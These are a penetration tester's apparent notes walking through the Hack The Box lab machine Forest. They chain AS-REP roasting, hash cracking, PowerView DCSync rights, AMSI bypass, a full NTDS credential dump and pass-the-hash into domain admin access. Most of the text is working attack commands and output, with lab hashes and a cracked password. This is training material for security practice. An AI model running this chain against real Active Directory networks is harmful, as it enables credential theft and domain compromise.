https://0xdf.gitlab.io/2020/03/21/htb-forest.html

### Nmap
nmap shows a lot of ports typical of Windows machines without the firewall:
```
root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.161
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:22 EDT
Warning: 10.10.10.161 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.161
Host is up (0.031s latency).
Not shown: 64742 closed ports, 769 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49678/tcp open  unknown
49697/tcp open  unknown
49898/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 20.35 seconds

root@kali# nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA scans/nmap-tcpscripts 10.10.10.161
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:24 EDT
Nmap scan report for 10.10.10.161
Host is up (0.030s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-14 18:32:33Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf       .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=10/14%Time=5DA4BD82%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m32s, deviation: 4h02m30s, median: 7m31s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2019-10-14T11:34:51-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-10-14T18:34:52
|_  start_date: 2019-10-14T09:52:45

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 281.19 seconds

root@kali# nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.10.10.161
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:30 EDT
Warning: 10.10.10.161 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.161
Host is up (0.091s latency).
Not shown: 65457 open|filtered ports, 74 closed ports
PORT      STATE SERVICE
123/udp   open  ntp
389/udp   open  ldap
58399/udp open  unknown
58507/udp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 73.74 seconds
```

### DNS
`htb.local` as the nmap result

```
dig @$IP htb.local
```

### RPC 445
`rpcclient -U "" -N $IP`

```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```
save as users.raw

###  Password Spraying - Making a Target User List (HTB academy)
##### Method 1 re-assembly rpcclient users list
```bash
cat users.raw | cut -d"]" -f1 | tr "[" " " | cut -d " " -f2 > users.txt

# optional sorting below 
sort -u users.txt | uniq
```
##### Method 2
```
crackmapexec smb $IP --users
```

##### Method 3. not too reckon
```
/opt/kerbrute_linux_amd64 userenum -d htb.local --dc $IP /usr/share/wordlists/seclists/Usernames/Names/names.txt
```

### ASREPRoasting from Miscellaneous Misconfigurations (HTB academy)
##### Retrieving the AS-REP Using Kerbrute like the method 3 above
##### Hunting for Users with Kerberoast Pre-auth Not Required
```bash
impacket-GetNPUsers htb.local/ -dc-ip $IP -no-pass -usersfile users.txt 
```

##### Results
```bash
./GetNPUsers.py htb.local/ -no-pass -usersfile users.txt -dc-ip $IP | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'
```

```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:ddc0281aae9de852e6a3742a9304eddd$5c4971d84cb7b3c3825e9e0ec037fcfe7bf1346b9548bf3e7c48fe97b30e81f2f1d2f88b44c27c46edf1aee4faf5dc2292d17a8080a0ee6d9b5d794f1783fbbbbf14d7f88b54bf3c1129a4e8f52ad6a0a2c6cd2a23b9a39d4ad53e5e686130d6a30c4d93a825b89455fb7fc86989d660540dd2d0117d145a30f7919317bd7cb46a6499bd07b92ff6bbf276c766888fa19fc497ff96fa02c55c71f18e5a0494e666686d03cb946b52280df55b071c9c46a87d0380ff286219656bf6614890efc46b0d5acf18d9406983e28235df521e77c04373a9538e641fba9bcca92f9f44a64c94ac0caf3e

$krb5asrep$23$svc-alfresco@HTB.LOCAL:7f409a8728db287dc66cebd404de8f76$a9b55fd6d781259c25c6d1d89ae6ec559d8b694ebba4c98700422d988a7165db39525ff0d646894a8cfb9a49d1f5e76c81eda2a3d5f31e9626eb6afdcf4e897bd03687156ea1d23f8f67132ec7d423bf66d1b9ef89a32aaa81fc36f8c9c3dd6426c53936c008834cd43d043063331fa2fa99a02cc35c597c57dc396f2f64d4f2d9d684e4c0e4e93d17e27f8dab24b00c313d373f1215baf78a537e476775f567b815b082f5ea0330bf63e18ff31b912f421707a550d69353c4163936b98edbd9e6badd2ea02e1627078897f403e3c36574c93a1ffb26e2d64d966d1350afff7e1f3821510acc
```

### Crack Hash
```
❯ hashcat -m 18200 --force -a 0 hash /usr/share/wordlists/rockyou.txt
```

svc-alfresco@HTB.LOCAL
s3rvice

### Foothold
```bash
evil-winrm -i $IP -u svc-alfresco -p s3rvice

# or

❯ crackmapexec winrm $IP -u svc-alfresco -p s3rvice
WINRM       10.129.232.105  5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
WINRM       10.129.232.105  5985   FOREST           [*] http://10.129.232.105:5985/wsman
WINRM       10.129.232.105  5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

### BloodHound since it's a Domain Controller
```evil-winrm
upload /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1

Import-Module ./SharpHound.ps1

Invoke-BloodHound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
```

### SMB share to get result zip back
```bash
sudo /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -user as -password as
```

```evil-winrm
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net use \\10.10.16.2\share /u:as as
The command completed successfully.
s3rvice
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> copy 2022* \\10.10.16.2\share
```

##### Above didn't work since it need the compatible version.
https://github.com/BloodHoundAD/SharpHound/releases/tag/v1.1.0

Alternatively, use BloodHound.py

##### Clean up by del the share
`net use /d \\10.10.16.2\share`

### Dive in BloodHound
1. Start the current user as owned.
2. Query "Find Shortest Paths to Domain Admins"
3. Right click on GenericAll

##### Create another user to make it as DomainGroupMember (Equivlent to BloodHound abuse Generil all); First Step
```powershell
$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $SecPassword)

Add-DomainGroupMember -Identity 'Domain Admins' -Members 'svc-alfresco' -Credential $Cred
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'htb\svc-alfresco' -Credential $Cred

# Verify
Get-DomainGroupMember -Identity 'Domain Admins'
```
The term 'Add-DomainGroupMember' is not recognized as the name of a cmdlet.... Not working above
Try 0xdf way instead

##### Add-DomainObjectAcl (Equivlent to BloodHound abuse WriteDacl); Second Step
```
Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
```
The term 'Add-DomainObjectAcl' is not recognized as the name of a cmdlet.... Not working either

### Now it's time to upload PowerView since I forgot to do so
```bash
certutil -urlcache -f http://10.10.16.9/PowerView.ps1 PowerView.ps1

Import-Module .\PowerView.ps1
```
or
`upload /usr/share/windows-resources/powersploit/Recon/PowerView.ps1`

Or try again above commands. The `Add-DomainGroupMember` access denied. `Add-DomainObjectAcl` got blocked.

So, looks like tt will fail as defender stop importing the script(PowerView.ps1) here.

### Follow the video from ippsec as it's more clear for what's happening here
##### Below are two commands equal to the "First Step". Bypass the blocked importing of PowerView.ps1
1. Create a user that natively belongs to ACCOUNT OPERATORS 
```
net user alvin s3rvice /add /domain
```
2. Add the new user to the group "Exchange Windows Permissions"
```
net group "Exchange Windows Permissions" alvin /add /domain
```

### DCSync Attack (Below two commands equal to the "Second Step")
```
Import-Module .\PowerView.ps1
Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'alvin' -TargetIdentity 'htb.local\Domain Admins' -Rights DCSync

export IP=10.129.95.210
impacket-secretsdump -just-dc alvin:s3rvice@$IP

impacket-secretsdump alvin:s3rvice@$IP
```
not working, still need to import the powerview successfully to do so.
Question, how to bypass for import powerview?

There are two ways. One use 4MSI show below. The other one uses the LDAP systax.
```
Import-Module .\PowerView.ps1

$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\alvin', $SecPassword)

Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'alvin' -TargetIdentity 'DC=htb,DC=local' -Rights DCSync
```
By gooling the syntax of Add-DomainObjectAcl. It works. Get the hash
```
❯ impacket-secretsdump -just-dc alvin:s3rvice@$IP
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
alvin:10101:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:dc00a4420a3c605f4f466e4df074e5af:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
alvin:aes256-cts-hmac-sha1-96:2c5114cc5c61a5f27826aadaf7c4001856771cd7dd79a7b7646a9cb82de48978
alvin:aes128-cts-hmac-sha1-96:47f9f828a9041f8b4c33fd6ae2762196
alvin:des-cbc-md5:0e753e324f23ce3e
FOREST$:aes256-cts-hmac-sha1-96:c26406c901197fdf165de5a0f77130bd058997908070690fd817d834f8a5b75a
FOREST$:aes128-cts-hmac-sha1-96:18cc0b69c5af872adc954793963771eb
FOREST$:des-cbc-md5:c8132fbf73c71fa8
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up... 
```
evil-winrm -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -i $IP

# Others
### DCSync Privileges needs PowerView.ps1 bypass-4MSI and two other ways to do Privilege Escalation

```bash
net group "Exchange Windows Permissions" svc-alfresco /add /domain
net localgroup "Remote Management Users" svc-alfresco /add /domain

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', $SecPassword)

Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync # It will fail as defender stop importing the script(PowerView.ps1) here
```

##### menu -> Bypass-4MSI
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco> Bypass-4MSI
[+] Success!
```

##### rerun
```bash
impacket-secretsdump -just-dc svc-alfresco:s3rvice@10.129.232.105

[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::

evil-winrm -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -i $IP
```

### Life saver ntlmrelayx.py if none of them working
```bash
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t ldap://$IP --escalate-user svc-alfresco

# It actually runs aclpwn.py aclpwn-20211009-001222.restore 
```
Although, i did run it twice to make it work
https://rootinjail.com/blog/post/htb-forest/
Above link show all of three ways to root.